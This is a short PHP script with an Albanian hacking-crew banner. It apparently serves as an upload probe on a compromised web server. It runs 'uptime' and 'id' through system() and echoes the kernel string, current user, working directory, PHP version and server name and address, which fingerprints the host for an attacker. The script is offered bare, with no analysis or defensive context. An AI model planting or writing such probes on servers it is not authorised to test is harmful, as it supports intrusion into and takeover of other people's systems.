<?
echo "ALBANIA<br>";
$alb = @php_uname();
$alb2 = system(uptime);
$alb3 = system(id);
$alb4 = @getcwd();
$alb5 = getenv("SERVER_SOFTWARE");
$alb6 = phpversion();
$alb7 = $_SERVER['SERVER_NAME'];
$alb8 = gethostbyname($SERVER_ADDR);
$alb9 = get_current_user();
$os = @PHP_OS;
echo "os: $os<br>";
echo "uname -a: $alb<br>";
echo "uptime: $alb2<br>";
echo "id: $alb3<br>";
echo "pwd: $alb4<br>";
echo "user: $alb9<br>";
echo "phpv: $alb6<br>";
echo "SoftWare: $alb5<br>";
echo "ServerName: $alb7<br>";
echo "ServerAddr: $alb8<br>";
echo "UNITED ALBANIANS aka ALBOSS PARADISE<br>";
exit;
?>